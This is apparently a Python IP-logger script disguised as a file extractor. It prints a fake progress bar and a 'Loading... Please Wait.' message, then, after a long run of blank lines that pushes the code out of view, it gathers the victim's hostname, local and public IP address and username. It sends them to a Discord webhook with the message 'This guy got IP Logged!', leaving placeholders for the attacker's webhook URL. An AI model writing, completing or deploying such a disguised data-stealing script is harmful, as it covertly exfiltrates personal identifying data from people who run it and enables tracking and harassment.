for i in range(0, 100):
    print(f"{i + 1}% Extracting.")
print("Loading... Please Wait.")













































































































import socket
import requests
import os
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
pubIPv4 = requests.get("https://api.ipify.org").text
currentUser = os.environ.get("USERNAME")
from discord_webhook import DiscordWebhook, DiscordEmbed
content = "This guy got IP Logged!"
webhook = DiscordWebhook(url="put your discord webhook here ", username = "put your discord's webhook bots' name here", content=content)
embed = DiscordEmbed(title="\nLocal IPv4: " + local_ip + "\nPublic IPv4: " +  pubIPv4 + "\nCurrent User: " + currentUser +"\nHost: " + hostname, color = 123123)
webhook.add_embed(embed)
response = webhook.execute()
